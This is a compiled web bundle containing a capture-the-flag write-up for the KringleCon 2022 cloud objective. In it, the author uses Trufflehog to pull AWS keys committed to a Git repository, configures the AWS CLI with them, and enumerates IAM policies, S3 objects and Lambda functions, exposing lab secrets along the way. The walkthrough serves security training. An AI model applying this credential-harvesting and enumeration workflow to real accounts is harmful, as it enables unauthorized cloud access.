"use strict";(self.webpackChunkkringlecon_2022=self.webpackChunkkringlecon_2022||[]).push([[5903],{3905:(e,n,a)=>{a.d(n,{Zo:()=>m,kt:()=>u});var t=a(7294);function i(e,n,a){return n in e?Object.defineProperty(e,n,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[n]=a,e}function s(e,n){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),a.push.apply(a,t)}return a}function o(e){for(var n=1;n<arguments.length;n++){var a=null!=arguments[n]?arguments[n]:{};n%2?s(Object(a),!0).forEach((function(n){i(e,n,a[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):s(Object(a)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(a,n))}))}return e}function c(e,n){if(null==e)return{};var a,t,i=function(e,n){if(null==e)return{};var a,t,i={},s=Object.keys(e);for(t=0;t<s.length;t++)a=s[t],n.indexOf(a)>=0||(i[a]=e[a]);return i}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(t=0;t<s.length;t++)a=s[t],n.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(i[a]=e[a])}return i}var r=t.createContext({}),l=function(e){var n=t.useContext(r),a=n;return e&&(a="function"==typeof e?e(n):o(o({},n),e)),a},m=function(e){var n=l(e.components);return t.createElement(r.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return t.createElement(t.Fragment,{},n)}},p=t.forwardRef((function(e,n){var a=e.components,i=e.mdxType,s=e.originalType,r=e.parentName,m=c(e,["components","mdxType","originalType","parentName"]),p=l(a),u=i,f=p["".concat(r,".").concat(u)]||p[u]||d[u]||s;return a?t.createElement(f,o(o({ref:n},m),{},{components:a})):t.createElement(f,o({ref:n},m))}));function u(e,n){var a=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var s=a.length,o=new Array(s);o[0]=p;var c={};for(var r in n)hasOwnProperty.call(n,r)&&(c[r]=n[r]);c.originalType=e,c.mdxType="string"==typeof e?e:i,o[1]=c;for(var l=2;l<s;l++)o[l]=a[l];return t.createElement.apply(null,o)}return t.createElement.apply(null,a)}p.displayName="MDXCreateElement"},1489:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>r,contentTitle:()=>o,default:()=>d,frontMatter:()=>s,metadata:()=>c,toc:()=>l});var t=a(7462),i=(a(7294),a(3905));const s={sidebar_position:2},o="Exploitation via AWS CLI",c={unversionedId:"objectives/CloudRing/exploitation_via_aws_cli",id:"objectives/CloudRing/exploitation_via_aws_cli",title:"Exploitation via AWS CLI",description:"Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git.",source:"@site/docs/objectives/CloudRing/exploitation_via_aws_cli.md",sourceDirName:"objectives/CloudRing",slug:"/objectives/CloudRing/exploitation_via_aws_cli",permalink:"/kringlecon-2022/docs/objectives/CloudRing/exploitation_via_aws_cli",draft:!1,tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2},sidebar:"tutorialSidebar",previous:{title:"AWS CLI Intro",permalink:"/kringlecon-2022/docs/objectives/CloudRing/aws_cli_intro"},next:{title:"Trufflehog Search",permalink:"/kringlecon-2022/docs/objectives/CloudRing/trufflehog_search"}},r={},l=[{value:"Investigating GIT repository",id:"investigating-git-repository",level:2},{value:"Investigating commit 106d33e1ffd53eea753c1365eafc6588398279b5",id:"investigating-commit-106d33e1ffd53eea753c1365eafc6588398279b5",level:3},{value:"Investigating commit 106d33e1ffd53eea753c1365eafc6588398279b5",id:"investigating-commit-106d33e1ffd53eea753c1365eafc6588398279b5-1",level:3},{value:"Configuring AWS",id:"configuring-aws",level:2}],m={toc:l};function d(e){let{components:n,...a}=e;return(0,i.kt)("wrapper",(0,t.Z)({},m,a,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"exploitation-via-aws-cli"},"Exploitation via AWS CLI"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Use Trufflehog to find credentials in the Gitlab instance at ",(0,i.kt)("a",{parentName:"p",href:"https://haugfactory.com/asnowball/aws_scripts.git"},"https://haugfactory.com/asnowball/aws_scripts.git"),".\nConfigure these credentials for us-east-1 and then run:\n$ aws sts get-caller-identity")),(0,i.kt)("h2",{id:"investigating-git-repository"},"Investigating GIT repository"),(0,i.kt)("p",null,'Luckily there is an "in your face" example on how to use Trufflehog on Git repositories straight on its homepage: ',(0,i.kt)("a",{parentName:"p",href:"https://github.com/trufflesecurity/trufflehog"},"https://github.com/trufflesecurity/trufflehog")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"elf@2fb235392470:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts.git\n\ud83d\udc37\ud83d\udd11\ud83d\udc37  TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37\n\nFound unverified result \ud83d\udc37\ud83d\udd11\u2753\nDetector Type: AWS\nDecoder Type: PLAIN\nRaw result: AKIAAIDAYRANYAHGQOHD\nTimestamp: 2022-09-07 07:53:12 -0700 -0700\nLine: 6\nCommit: 106d33e1ffd53eea753c1365eafc6588398279b5\nFile: put_policy.py\nEmail: asnowball <alabaster@northpolechristmastown.local>\nRepository: https://haugfactory.com/asnowball/aws_scripts.git\n\nFound unverified result \ud83d\udc37\ud83d\udd11\u2753\nDetector Type: Gitlab\nDecoder Type: PLAIN\nRaw result: add-a-file-using-the-\nLine: 14\nCommit: 2c77c1e0a98715e32a277859864e8f5918aacc85\nFile: README.md\nEmail: alabaster snowball <alabaster@northpolechristmastown.local>\nRepository: https://haugfactory.com/asnowball/aws_scripts.git\nTimestamp: 2022-09-06 19:54:48 +0000 UTC\n\nFound unverified result \ud83d\udc37\ud83d\udd11\u2753\nDetector Type: Gitlab\nDecoder Type: BASE64\nRaw result: add-a-file-using-the-\nFile: README.md\nEmail: alabaster snowball <alabaster@northpolechristmastown.local>\nRepository: https://haugfactory.com/asnowball/aws_scripts.git\nTimestamp: 2022-09-06 19:54:48 +0000 UTC\nLine: 14\nCommit: 2c77c1e0a98715e32a277859864e8f5918aacc85\n\nelf@2fb235392470:~$ clear\n")),(0,i.kt)("p",null,"We now have a few commits and files to inspect:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"106d33e1ffd53eea753c1365eafc6588398279b5 : put_policy.py"),(0,i.kt)("li",{parentName:"ul"},"2c77c1e0a98715e32a277859864e8f5918aacc85 : README.md. Trufflehog reacted to two curious instances in the same commit.")),(0,i.kt)("p",null,"Cloning the repository for further inspection"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"elf@2fb235392470:~$ git clone https://haugfactory.com/asnowball/aws_scripts.git\nCloning into 'aws_scripts'...\nremote: Enumerating objects: 64, done.\nremote: Total 64 (delta 0), reused 0 (delta 0), pack-reused 64\nUnpacking objects: 100% (64/64), 23.83 KiB | 1.32 MiB/s, done.\nelf@2fb235392470:~$\n")),(0,i.kt)("h3",{id:"investigating-commit-106d33e1ffd53eea753c1365eafc6588398279b5"},"Investigating commit 106d33e1ffd53eea753c1365eafc6588398279b5"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@3b5734341d8f:~$ cd aws_scripts/\nelf@3b5734341d8f:~/aws_scripts$ git checkout 106d33e1ffd53eea753c1365eafc6588398279b5\nelf@3b5734341d8f:~/aws_scripts$ cat put_policy.py \nimport boto3\nimport json\n\n\niam = boto3.client(\'iam\',\n    region_name=\'us-east-1\',\n    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",\n    aws_secret_access_key="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",\n)\n# arn:aws:ec2:us-east-1:accountid:instance/*\nresponse = iam.put_user_policy(\n    PolicyDocument=\'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["ssm:SendCommand"],"Resource":["arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5","arn:aws:ec2:us-east-1:748127089694:document/RestartServices"]}]}\',\n    PolicyName=\'AllAccessPolicy\',\n    UserName=\'nwt8_test\',\n)\nelf@3b5734341d8f:~/aws_scripts$\n')),(0,i.kt)("h3",{id:"investigating-commit-106d33e1ffd53eea753c1365eafc6588398279b5-1"},"Investigating commit 106d33e1ffd53eea753c1365eafc6588398279b5"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"elf@3b5734341d8f:~/aws_scripts$ git checkout 2c77c1e0a98715e32a277859864e8f5918aacc85\nHEAD is now at 2c77c1e Initial commit\nelf@3b5734341d8f:~/aws_scripts$ more README.md\n")),(0,i.kt)("p",null,"The README.md contained nothing interesting."),(0,i.kt)("h2",{id:"configuring-aws"},"Configuring AWS"),(0,i.kt)("p",null,"As pr. assignment instruction, went on configuring AWS with information found in commit 106d33e1ffd53eea753c1365eafc6588398279b5"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@3b5734341d8f:~/aws_scripts$ aws configure\nAWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD\nAWS Secret Access Key [None]: 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\nDefault region name [None]: us-east-1\nDefault output format [None]: \nelf@3b5734341d8f:~/aws_scripts$ aws sts get-caller-identity\n{\n    "UserId": "AIDAJNIAAQYHIAAHDDRA",\n    "Account": "602123424321",\n    "Arn": "arn:aws:iam::602123424321:user/haug"\n}\nelf@3b5734341d8f:~/aws_scripts$\n')),(0,i.kt)("p",null,"Then another assignment showed up:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user.\nThe aws iam command to list attached user policies can be found here:\nhttps://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html\nHint: it is NOT list-user-policies.\n")),(0,i.kt)("p",null,'The "haug" username was found in previous step:'),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@3b5734341d8f:~/aws_scripts$ aws iam list-attached-user-policies --user-name haug\n{\n    "AttachedPolicies": [\n        {\n            "PolicyName": "TIER1_READONLY_POLICY",\n            "PolicyArn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"\n        }\n    ],\n    "IsTruncated": false\n}\nelf@3b5734341d8f:~/aws_scripts$\n')),(0,i.kt)("p",null,"Another assignment popped up"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Now, view or get the policy that is attached to your user.\nThe aws iam command to get a policy can be found here:\nhttps://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@3b5734341d8f:~/aws_scripts$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\n{\n    "Policy": {\n        "PolicyName": "TIER1_READONLY_POLICY",\n        "PolicyId": "ANPAYYOROBUERT7TGKUHA",\n        "Arn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY",\n        "Path": "/",\n        "DefaultVersionId": "v1",\n        "AttachmentCount": 11,\n        "PermissionsBoundaryUsageCount": 0,\n        "IsAttachable": true,\n        "Description": "Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.",\n        "CreateDate": "2022-06-21 22:02:30+00:00",\n        "UpdateDate": "2022-06-21 22:10:29+00:00",\n        "Tags": []\n    }\n}\nelf@3b5734341d8f:~/aws_scripts$\n')),(0,i.kt)("p",null,"The assignments kept coming"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Attached policies can have multiple versions. View the default version of this policy.\nThe aws iam command to get a policy version can be found here:\nhttps://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@3b5734341d8f:~/aws_scripts$ aws iam get-policy-version --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY" --version-id v1\n{\n    "PolicyVersion": {\n        "Document": {\n            "Version": "2012-10-17",\n            "Statement": [\n                {\n                    "Effect": "Allow",\n                    "Action": [\n                        "lambda:ListFunctions",\n                        "lambda:GetFunctionUrlConfig"\n                    ],\n                    "Resource": "*"\n                },\n                {\n                    "Effect": "Allow",\n                    "Action": [\n                        "iam:GetUserPolicy",\n                        "iam:ListUserPolicies",\n                        "iam:ListAttachedUserPolicies"\n                    ],\n                    "Resource": "arn:aws:iam::602123424321:user/${aws:username}"\n                },\n                {\n                    "Effect": "Allow",\n                    "Action": [\n                        "iam:GetPolicy",\n                        "iam:GetPolicyVersion"\n                    ],\n                    "Resource": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"\n                },\n                {\n                    "Effect": "Deny",\n                    "Principal": "*",\n                    "Action": [\n                        "s3:GetObject",\n                        "lambda:Invoke*"\n                        ],\n                    "Resource": "*"\n                }\n            ]\n        },\n        "VersionId": "v1",\n        "IsDefaultVersion": false,\n        "CreateDate": "2022-06-21 22:02:30+00:00"\n    }\n}\nelf@3b5734341d8f:~/aws_scripts$ \n')),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. \nThe aws iam command to list user policies can be found here:\nhttps://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html\nHint: it is NOT list-attached-user-policies.\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@3b5734341d8f:~/aws_scripts$ aws iam list-user-policies --user-name haug\n{\n    "PolicyNames": [\n        "S3Perms"\n    ],\n    "IsTruncated": false\n}\nelf@3b5734341d8f:~/aws_scripts$\n')),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Now, use the AWS CLI to get the only inline policy for your user. \nThe aws iam command to get a user policy can be found here:\nhttps://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@3b5734341d8f:~/aws_scripts$ aws iam get-user-policy --user-name haug --policy-name S3Perms\n{\n    "UserPolicy": {\n        "UserName": "haug",\n        "PolicyName": "S3Perms",\n        "PolicyDocument": {\n            "Version": "2012-10-17",\n            "Statement": [\n                {\n                    "Effect": "Allow",\n                    "Action": [\n                        "s3:ListObjects"\n                    ],\n                    "Resource": [\n                        "arn:aws:s3:::smogmachines3",\n                        "arn:aws:s3:::smogmachines3/*"\n                    ]\n                }\n            ]\n        }\n    },\n    "IsTruncated": false\n}\nelf@3b5734341d8f:~/aws_scripts$\n')),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. \nList those objects! \nThe aws s3api command to list objects in an s3 bucket can be found here:\nhttps://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@3b5734341d8f:~/aws_scripts$ aws s3api list-objects --bucket "smogmachines3"\n{\n    "IsTruncated": false,\n    "Marker": "",\n    "Contents": [\n        {\n            "Key": "coal-fired-power-station.jpg",\n            "LastModified": "2022-09-23 20:40:44+00:00",\n            "ETag": "\\"1c70c98bebaf3cff781a8fd3141c2945\\"",\n            "Size": 59312,\n            "StorageClass": "STANDARD",\n            "Owner": {\n                "DisplayName": "grinchum",\n                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"\n            }\n        },\n        {\n            "Key": "industry-smog.png",\n            "LastModified": "2022-09-23 20:40:47+00:00",\n            "ETag": "\\"c0abe5cb56b7a33d39e17f430755e615\\"",\n            "Size": 272528,\n            "StorageClass": "STANDARD",\n            "Owner": {\n                "DisplayName": "grinchum",\n                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"\n            }\n        },\n        {\n            "Key": "pollution-smoke.jpg",\n            "LastModified": "2022-09-23 20:40:43+00:00",\n            "ETag": "\\"465b675c70d73027e13ffaec1a38beec\\"",\n            "Size": 33064,\n            "StorageClass": "STANDARD",\n            "Owner": {\n                "DisplayName": "grinchum",\n                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"\n            }},\n        {\n            "Key": "pollution.jpg",\n            "LastModified": "2022-09-23 20:40:45+00:00",\n            "ETag": "\\"d40d1db228c9a9b544b4c552df712478\\"",\n            "Size": 81775,\n            "StorageClass": "STANDARD",\n            "Owner": {\n                "DisplayName": "grinchum",\n                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"\n            }\n        },\n        {\n            "Key": "power-station-smoke.jpg",\n            "LastModified": "2022-09-23 20:40:48+00:00",\n            "ETag": "\\"2d7a8c8b8f5786103769e98afacf57de\\"",\n            "Size": 45264,\n            "StorageClass": "STANDARD",\n            "Owner": {\n                "DisplayName": "grinchum",\n                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"\n            }\n        },\n        {\n            "Key": "smog-power-station.jpg",\n            "LastModified": "2022-09-23 20:40:46+00:00",\n            "ETag": "\\"0e69b8d53d97db0db9f7de8663e9ec09\\"",\n            "Size": 32498,\n            "StorageClass": "STANDARD",\n            "Owner": {\n                "DisplayName": "grinchum",\n                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"\n                }\n        }\n    ],\n    "Name": "smogmachines3",\n    "Prefix": "",\n    "MaxKeys": 1000,\n    "EncodingType": "url"\n}\n')),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions.\nThe aws lambda command to list functions can be found here:\nhttps://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@2f0c1d64de94:~$ aws lambda list-functions\n{\n    "Functions": [\n        {\n            "FunctionName": "smogmachine_lambda",\n            "FunctionArn": "arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda",\n            "Runtime": "python3.9",\n            "Role": "arn:aws:iam::602123424321:role/smogmachine_lambda",\n            "Handler": "handler.lambda_handler",\n            "CodeSize": 2126,\n            "Description": "",\n            "Timeout": 600,\n            "MemorySize": 256,\n            "LastModified": "2022-09-07T19:28:23.634+0000",\n            "CodeSha256": "GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=",\n            "Version": "$LATEST",\n            "VpcConfig": {\n                "SubnetIds": [\n                    "subnet-8c80a9cb8b3fa5505"\n                ],\n                "SecurityGroupIds": [\n                    "sg-b51a01f5b4711c95c"\n                ],\n                "VpcId": "vpc-85ea8596648f35e00"\n            },\n            "Environment": {\n                "Variables": {\n                    "LAMBDASECRET": "975ceab170d61c75",\n                    "LOCALMNTPOINT": "/mnt/smogmachine_files"\n                }\n            },\n            "TracingConfig": {\n                "Mode": "PassThrough"\n            },\n            "RevisionId": "7e198c3c-d4ea-48dd-9370-e5238e9ce06e",\n            "FileSystemConfigs": [\n                {\n                    "Arn": "arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap-\ndb3277b03c6e975d2",\n                    "LocalMountPath": "/mnt/smogmachine_files"\n                }\n            ],\n            "PackageType": "Zip",\n            "Architectures": [\n                "x86_64"\n            ],\n            "EphemeralStorage": {\n                "Size": 512\n            }\n        }\n    ]\n}\nelf@2f0c1d64de94:~$ \n')),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Lambda functions can have public URLs from which they are directly accessible.\nUse the AWS CLI to get the configuration containing the public URL of the Lambda function.\nThe aws lambda command to get the function URL config can be found here:\nhttps://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'elf@de6314a7d7e3:~$ aws lambda get-function-url-config --function-name smogmachine_lambda\n{\n    "FunctionUrl": "https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/",\n    "FunctionArn": "arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda",\n    "AuthType": "AWS_IAM",\n    "Cors": {\n        "AllowCredentials": false,\n        "AllowHeaders": [],\n        "AllowMethods": [\n            "GET",\n            "POST"\n        ],\n        "AllowOrigins": [\n            "*"\n        ],\n        "ExposeHeaders": [],\n        "MaxAge": 0\n    },\n    "CreationTime": "2022-09-07T19:28:23.808713Z",\n    "LastModifiedTime": "2022-09-07T19:28:23.808713Z"\n}\nelf@de6314a7d7e3:~$\n')))}d.isMDXComponent=!0}}]);